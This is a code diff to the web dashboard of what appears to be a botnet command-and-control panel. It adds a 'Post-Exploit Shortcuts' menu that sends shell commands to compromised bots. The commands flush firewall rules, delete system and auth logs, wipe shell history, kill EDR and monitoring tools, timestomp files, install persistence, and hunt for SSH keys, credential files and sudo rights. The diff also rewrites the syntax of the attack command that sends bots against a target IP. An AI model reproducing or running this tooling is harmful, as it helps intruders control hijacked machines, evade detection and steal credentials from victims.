@@ -1051,262 +1051,9 @@ function populateRelayDropdown() {
   }).catch(function () { });
 }
 
-function loadRelays() {
-  fetch('/api/relays').then(function (r) { return r.json(); }).then(function (relays) {
-    _relaysCache = relays || [];
-    renderRelayTable(relays);
-  }).catch(function () { });
-}
-
-function renderRelayTable(relays) {
-  var wrap = document.getElementById('relay-table-wrap');
-  if (!wrap) return;
-  if (!relays || !relays.length) {
-    wrap.innerHTML = '<div class="no-bots">No relays configured. Add a relay server above.</div>';
-    return;
-  }
-  var html = '<table class="socks-dash-table"><thead><tr><th>Name</th><th>Host</th><th>Control Port</th><th>SOCKS Port</th><th>Connect String</th><th></th></tr></thead><tbody>';
-  relays.forEach(function (r) {
-    html += '<tr><td style="color:var(--accent);font-family:monospace">' + escHtml(r.name) + '</td>' +
-      '<td style="font-family:monospace">' + escHtml(r.host) + '</td>' +
-      '<td>' + escHtml(r.controlPort) + '</td>' +
-      '<td>' + escHtml(r.socksPort) + '</td>' +
-      '<td style="font-family:monospace;color:var(--blue)">' + escHtml(r.host + ':' + r.controlPort) + '</td>' +
-      '<td><button class="socks-stop-btn" onclick="deleteRelay(\'' + escHtml(r.id) + '\')">Delete</button></td></tr>';
-  });
-  wrap.innerHTML = html + '</tbody></table>';
-  var tabCount = document.getElementById('tab-relays-count');
-  if (tabCount) tabCount.textContent = relays.length;
-}
-
-function addRelay() {
-  var name = (document.getElementById('relay-name') || {}).value || '';
-  var host = (document.getElementById('relay-host') || {}).value || '';
-  var cp = (document.getElementById('relay-cp') || {}).value || '9001';
-  var sp = (document.getElementById('relay-sp') || {}).value || '1080';
-  if (!host) { showToast('Relay host is required', false); return; }
-  if (!cp) cp = '9001';
-  if (!sp) sp = '1080';
-  fetch('/api/relays', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ name: name, host: host, controlPort: cp, socksPort: sp })
-  }).then(function (r) { return r.json(); }).then(function (d) {
-    if (d.id) {
-      showToast('Relay added: ' + (d.name || host), true);
-      document.getElementById('relay-name').value = '';
-      document.getElementById('relay-host').value = '';
-      document.getElementById('relay-cp').value = '';
-      document.getElementById('relay-sp').value = '';
-      loadRelays();
-    } else {
-      showToast(d.error || 'Failed to add relay', false);
-    }
-  }).catch(function () { showToast('Request failed', false); });
-}
-
-function deleteRelay(id) {
-  if (!confirm('Remove this relay?')) return;
-  fetch('/api/relays?id=' + encodeURIComponent(id), { method: 'DELETE' })
-    .then(function (r) { return r.json(); })
-    .then(function (d) {
-      showToast(d.success ? 'Relay removed' : (d.error || 'Failed'), d.success !== false);
-      loadRelays();
-    }).catch(function () { showToast('Request failed', false); });
-}
-
-// ---------------------------------------------------------------------------
-// Relay Phone-Home API
-// ---------------------------------------------------------------------------
-
-var _relayAPIRunning = false;
-
-function loadRelayAPIStatus() {
-  fetch('/api/relay-api').then(function (r) { return r.json(); }).then(function (d) {
-    _relayAPIRunning = d.running;
-    var statusEl = document.getElementById('relay-api-status');
-    var btn = document.getElementById('relay-api-toggle-btn');
-    var portInput = document.getElementById('relay-api-port');
-    if (statusEl) {
-      if (d.running) {
-        statusEl.innerHTML = '<span style="color:var(--green)">● Running on port ' + escHtml(d.port) + '</span>';
-      } else {
-        statusEl.innerHTML = '<span style="color:var(--text-dim)">○ Stopped</span>';
-      }
-    }
-    if (btn) {
-      btn.textContent = d.running ? 'Stop' : 'Start';
-      btn.style.background = d.running ? 'var(--red, #e74c3c)' : '';
-    }
-    if (portInput) {
-      if (d.running) {
-        portInput.value = d.port;
-        portInput.disabled = true;
-      } else {
-        portInput.disabled = false;
-      }
-    }
-    loadRelayStats();
-  }).catch(function () { });
-}
-
-function toggleRelayAPI() {
-  if (_relayAPIRunning) {
-    fetch('/api/relay-api', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ action: 'stop' })
-    }).then(function (r) { return r.json(); }).then(function (d) {
-      showToast(d.success ? 'Relay API stopped' : (d.error || 'Failed'), d.success);
-      loadRelayAPIStatus();
-    }).catch(function () { showToast('Request failed', false); });
-  } else {
-    var port = (document.getElementById('relay-api-port') || {}).value || '8443';
-    fetch('/api/relay-api', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ action: 'start', port: port })
-    }).then(function (r) { return r.json(); }).then(function (d) {
-      showToast(d.success ? 'Relay API started on port ' + port : (d.error || 'Failed'), d.success);
-      loadRelayAPIStatus();
-    }).catch(function () { showToast('Request failed', false); });
-  }
-}
-
-function loadRelayStats() {
-  Promise.all([
-    fetch('/api/relay-stats').then(function (r) { return r.json(); }).catch(function () { return {}; }),
-    fetch('/api/relays').then(function (r) { return r.json(); }).catch(function () { return []; })
-  ]).then(function (results) {
-    var liveStats = results[0] || {};
-    var configs = results[1] || [];
-    renderRelayStats(liveStats, configs);
-  });
-}
-
-function renderRelayStats(liveStats, configs) {
-  var wrap = document.getElementById('relay-stats-wrap');
-  var socksHealth = document.getElementById('socks-relay-health');
-
-  // Build a merged list: all configured relays + any live-only entries
-  var merged = {};
-  // Start with configured relays
-  (configs || []).forEach(function (c) {
-    var key = c.name || (c.host + ':' + c.socksPort);
-    merged[key] = {
-      name: c.name || key,
-      socks_port: c.socksPort || '1080',
-      host: c.host,
-      control_port: c.controlPort,
-      connected_bots: 0, sessions_total: 0, sessions_active: 0,
-      sessions_failed: 0, bytes_up: 0, bytes_down: 0, auth_failures: 0,
-      last_seen: null, _configured: true, _live: false
-    };
-  });
-  // Overlay live stats (match by name)
-  var liveKeys = Object.keys(liveStats || {});
-  liveKeys.forEach(function (name) {
-    var s = liveStats[name];
-    if (merged[name]) {
-      // Merge live data onto configured entry
-      for (var k in s) { merged[name][k] = s[k]; }
-      merged[name]._live = true;
-    } else {
-      // Live-only relay (not in config)
-      s._configured = false;
-      s._live = true;
-      merged[s.name || name] = s;
-    }
-  });
-
-  var keys = Object.keys(merged);
-
-  // --- Relays tab: full stats table ---
-  if (wrap) {
-    if (!keys.length) {
-      wrap.innerHTML = '';
-    } else {
-      var html = '<h4 style="color:var(--text-dim);margin:0 0 8px;font-size:13px">Live Relay Stats</h4>';
-      html += '<table class="socks-dash-table"><thead><tr><th>Relay</th><th>Bots</th><th>Sessions</th><th>Active</th><th>Failed</th><th>\u2191 Bytes</th><th>\u2193 Bytes</th><th>Auth Fail</th><th>Last Seen</th></tr></thead><tbody>';
-      keys.forEach(function (name) {
-        var s = merged[name];
-        var agoText = s._live ? relayAgo(s) : '<span style="color:var(--text-dim)">no data</span>';
-        html += '<tr>' +
-          '<td style="color:var(--accent);font-family:monospace">' + escHtml(s.name || name) + '</td>' +
-          '<td>' + (s.connected_bots || 0) + '</td>' +
-          '<td>' + (s.sessions_total || 0) + '</td>' +
-          '<td>' + (s.sessions_active || 0) + '</td>' +
-          '<td>' + (s.sessions_failed || 0) + '</td>' +
-          '<td style="font-family:monospace">' + humanBytes(s.bytes_up || 0) + '</td>' +
-          '<td style="font-family:monospace">' + humanBytes(s.bytes_down || 0) + '</td>' +
-          '<td>' + (s.auth_failures || 0) + '</td>' +
-          '<td>' + agoText + '</td>' +
-          '</tr>';
-      });
-      html += '</tbody></table>';
-      wrap.innerHTML = html;
-    }
-  }
-
-  // --- SOCKS tab: relay health cards ---
-  if (socksHealth) {
-    if (!keys.length) {
-      socksHealth.innerHTML = '<div style="color:var(--text-dim);font-size:13px;padding:8px 0">No relays configured. Add relays in the Relays tab.</div>';
-    } else {
-      var cards = '<h4 style="color:var(--text-dim);margin:0 0 10px;font-size:13px">Relay Health</h4><div class="relay-health-grid">';
-      keys.forEach(function (name) {
-        var s = merged[name];
-        var agoText = relayAgo(s);
-        var diffSec = s.last_seen ? Math.floor((Date.now() - new Date(s.last_seen).getTime()) / 1000) : 9999;
-        var healthDot, healthLabel, healthCss;
-        if (!s._live) {
-          healthDot = 'health-dot-dead';
-          healthLabel = 'No Data';
-          healthCss = 'health-nodata';
-        } else if (diffSec < 60) {
-          healthDot = 'health-dot-ok';
-          healthLabel = 'Healthy';
-          healthCss = 'health-green';
-        } else if (diffSec < 300) {
-          healthDot = 'health-dot-warn';
-          healthLabel = 'Stale';
-          healthCss = 'health-yellow';
-        } else {
-          healthDot = 'health-dot-stale';
-          healthLabel = 'Offline';
-          healthCss = 'health-red';
-        }
-        var totalBW = (s.bytes_up || 0) + (s.bytes_down || 0);
-        cards += '<div class="relay-health-card">' +
-          '<div class="rhc-header"><span class="health-dot ' + healthDot + '"></span>' +
-          '<span class="rhc-name">' + escHtml(s.name || name) + '</span>' +
-          '<span class="rhc-status rhc-status-' + healthCss + '">' + healthLabel + '</span></div>' +
-          '<div class="rhc-stats">' +
-          '<div class="rhc-stat"><span class="rhc-label">Bots</span><span class="rhc-val">' + (s.connected_bots || 0) + '</span></div>' +
-          '<div class="rhc-stat"><span class="rhc-label">Active</span><span class="rhc-val" style="color:var(--green)">' + (s.sessions_active || 0) + '</span></div>' +
-          '<div class="rhc-stat"><span class="rhc-label">Total</span><span class="rhc-val">' + (s.sessions_total || 0) + '</span></div>' +
-          '<div class="rhc-stat"><span class="rhc-label">Failed</span><span class="rhc-val" style="color:var(--red,#e74c3c)">' + (s.sessions_failed || 0) + '</span></div>' +
-          '<div class="rhc-stat"><span class="rhc-label">\u2191 Up</span><span class="rhc-val">' + humanBytes(s.bytes_up || 0) + '</span></div>' +
-          '<div class="rhc-stat"><span class="rhc-label">\u2193 Down</span><span class="rhc-val">' + humanBytes(s.bytes_down || 0) + '</span></div>' +
-          '<div class="rhc-stat"><span class="rhc-label">Bandwidth</span><span class="rhc-val" style="color:var(--accent)">' + humanBytes(totalBW) + '</span></div>' +
-          '<div class="rhc-stat"><span class="rhc-label">Auth Fail</span><span class="rhc-val">' + (s.auth_failures || 0) + '</span></div>' +
-          '</div>' +
-          '<div class="rhc-footer">' + (s.host ? escHtml(s.host) + ' \u00b7 ' : '') + 'SOCKS :' + escHtml(s.socks_port || '?') + (agoText ? ' \u00b7 ' + escHtml(agoText) : '') + '</div>' +
-          '</div>';
-      });
-      cards += '</div>';
-      socksHealth.innerHTML = cards;
-    }
-  }
-}
-
-function relayAgo(s) {
-  if (!s.last_seen) return '';
-  var diff = Math.floor((Date.now() - new Date(s.last_seen).getTime()) / 1000);
-  if (diff < 60) return diff + 's ago';
-  if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
-  return Math.floor(diff / 3600) + 'h ago';
-}
+function loadRelays() {}
+function loadRelayAPIStatus() {}
+function loadRelayStats() {}
 
 function humanBytes(b) {
   if (b < 1024) return b + ' B';
@@ -2028,6 +1775,82 @@ function shellStartSocks() {
 }
 
 // ---------------------------------------------------------------------------
+// Post-Exploit Shortcuts
+// ---------------------------------------------------------------------------
+
+var postExShortcuts = [
+  { cat: 'Quick Actions', items: [
+    { name: 'Persist All', desc: 'Install cron/startup persistence', cmd: '!persist' },
+    { name: 'Reinstall All', desc: 'Force re-download bot binary', cmd: '!reinstall' },
+    { name: 'Flush Firewall', desc: 'Drop all iptables rules', cmd: 'iptables -F && iptables -X && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT' },
+    { name: 'Kill Logging', desc: 'Stop syslog and clear logs', cmd: 'service rsyslog stop 2>/dev/null; service syslog-ng stop 2>/dev/null; rm -rf /var/log/*.log /var/log/syslog /var/log/auth.log' },
+    { name: 'Clear History', desc: 'Wipe shell history + unset', cmd: 'history -c; rm -f ~/.bash_history ~/.zsh_history; unset HISTFILE HISTSIZE' },
+    { name: 'Kill Monitors', desc: 'Stop common EDR/monitoring', cmd: "pkill -9 -f 'auditd|ossec|wazuh|falcon|sysdig|tcpdump|wireshark' 2>/dev/null" },
+    { name: 'Disable Cron', desc: 'Stop cron daemon (anti-cleanup)', cmd: 'service cron stop 2>/dev/null; service crond stop 2>/dev/null' },
+    { name: 'Timestomp', desc: 'Set file timestamps to 2023', cmd: 'find /tmp -maxdepth 1 -newer /etc/hostname -exec touch -t 202301010000 {} \\;' },
+    { name: 'DNS Flush', desc: 'Clear DNS resolver cache', cmd: 'resolvectl flush-caches 2>/dev/null; systemd-resolve --flush-caches 2>/dev/null; nscd -i hosts 2>/dev/null' },
+    { name: 'Kill Sysmon', desc: 'Stop sysmon for linux', cmd: 'service sysmonforlinux stop 2>/dev/null; pkill -9 sysmon 2>/dev/null' }
+  ]},
+  { cat: 'Recon', items: [
+    { name: 'System Info', desc: 'OS, kernel, hostname', cmd: 'uname -a; cat /etc/*release 2>/dev/null | head -5; hostname' },
+    { name: 'Network Info', desc: 'Interfaces, routes, DNS', cmd: 'ip -br a; ip route show default; cat /etc/resolv.conf 2>/dev/null | grep nameserver' },
+    { name: 'Open Ports', desc: 'Listening ports and PIDs', cmd: 'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null' },
+    { name: 'Users w/ Shell', desc: 'Accounts with login shell', cmd: "grep -v -E 'nologin|false|sync|halt|shutdown' /etc/passwd" },
+    { name: 'SUID Binaries', desc: 'Find setuid executables', cmd: 'find / -perm -4000 -type f 2>/dev/null' },
+    { name: 'Writable Dirs', desc: 'World-writable directories', cmd: 'find / -writable -type d 2>/dev/null | grep -v proc | head -20' },
+    { name: 'Cron Jobs', desc: 'All scheduled tasks', cmd: 'crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null' },
+    { name: 'Docker/LXC', desc: 'Container environment check', cmd: 'docker ps 2>/dev/null; lxc list 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head -5' },
+    { name: 'SSH Keys', desc: 'Find private keys on disk', cmd: "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null" },
+    { name: 'Credentials', desc: 'Config files with passwords', cmd: "grep -rl 'password\\|passwd\\|credential' /etc/ /opt/ /var/www/ 2>/dev/null | head -15" },
+    { name: 'Sudo Check', desc: 'Sudo permissions for user', cmd: "sudo -l 2>/dev/null; cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'" },
+    { name: 'Proc Tree', desc: 'Running process tree', cmd: 'ps auxf --width 200 2>/dev/null | head -30 || ps aux | head -30' },
+    { name: 'Kernel Version', desc: 'Kernel + possible exploits', cmd: 'uname -r; cat /proc/version' },
+    { name: 'Mount Points', desc: 'Mounted filesystems', cmd: "mount | grep -v -E 'proc|sys|cgroup|tmpfs'" }
+  ]}
+];
+
+function toggleShellShortcuts() {
+  var existing = document.getElementById('shell-shortcuts-menu');
+  if (existing) { existing.remove(); return; }
+
+  var menu = document.createElement('div');
+  menu.id = 'shell-shortcuts-menu';
+  menu.className = 'shell-shortcuts-menu';
+
+  postExShortcuts.forEach(function (cat) {
+    var hdr = document.createElement('div');
+    hdr.className = 'ssm-cat';
+    hdr.textContent = cat.cat;
+    menu.appendChild(hdr);
+    cat.items.forEach(function (item) {
+      var row = document.createElement('div');
+      row.className = 'ssm-item';
+      row.innerHTML = '<span class="ssm-name">' + escHtml(item.name) + '</span>' +
+        '<span class="ssm-desc">' + escHtml(item.desc) + '</span>';
+      row.onclick = function () {
+        if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+        var p = document.getElementById('shell-prompt').textContent;
+        appendOutput(p + ' ' + item.cmd + '\n');
+        shellWS.send(JSON.stringify({ command: item.cmd }));
+        menu.remove();
+      };
+      menu.appendChild(row);
+    });
+  });
+
+  // Close on outside click
+  function closeMenu(e) {
+    if (!menu.contains(e.target) && !e.target.closest('.shell-action-btn-shortcuts')) {
+      menu.remove();
+      document.removeEventListener('click', closeMenu);
+    }
+  }
+  setTimeout(function () { document.addEventListener('click', closeMenu); }, 0);
+
+  document.querySelector('.shell-actions').appendChild(menu);
+}
+
+// ---------------------------------------------------------------------------
 // Shell input handler
 // ---------------------------------------------------------------------------
 
@@ -2107,8 +1930,8 @@ document.addEventListener('keydown', function (e) {
     if (botsTab && !botsTab.classList.contains('active')) switchTab(botsTab);
     document.getElementById('bot-search').focus();
   }
-  if (e.key >= '1' && e.key <= '7') {
-    var tabs = ['tab-bots', 'tab-socks', 'tab-attack', 'tab-activity', 'tab-relays', 'tab-tasks', 'tab-users'];
+  if (e.key >= '1' && e.key <= '6') {
+    var tabs = ['tab-bots', 'tab-socks', 'tab-attack', 'tab-activity', 'tab-tasks', 'tab-users'];
     var tab = document.querySelector('[data-tab="' + tabs[parseInt(e.key) - 1] + '"]');
     if (tab) switchTab(tab);
   }
@@ -2434,8 +2257,8 @@ function fireAttack() {
   if (!target) { showToast('Enter a target IP', false); return; }
   if (!method) { showToast('Select a method', false); return; }
 
-  // Build command: !attack method ip port duration [key=val ...]
-  var cmd = '!attack ' + method + ' ' + target + ' ' + port + ' ' + duration;
+  // Build command: !method target port duration [key=val ...]
+  var cmd = '!' + method + ' ' + target + ' ' + port + ' ' + duration;
 
   // Gather advanced options dynamically from rendered fields (skip defaults)
   var optInputs = document.querySelectorAll('#atk-opts input[data-key]');
@@ -2491,7 +2314,7 @@ function stopAttack() {
       fetch('/api/command', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ command: '!stopattack', botID: botID })
+        body: JSON.stringify({ command: '!stop', botID: botID })
       })
         .then(function (r) { return r.json(); })
         .then(function (d) { showToast(d.message, d.success); })
@@ -2732,8 +2555,6 @@ setInterval(function () {
 }, 10000);
 
 // === Stubs for removed Armada features (not in VisionC2) ===
-if(typeof loadRelays==='undefined')window.loadRelays=function(){};
-if(typeof loadRelayAPIStatus==='undefined')window.loadRelayAPIStatus=function(){};
 if(typeof loadTasks==='undefined')window.loadTasks=function(){};
 if(typeof loadUsers==='undefined')window.loadUsers=function(){};
 if(typeof scannerStart==='undefined')window.scannerStart=function(){};
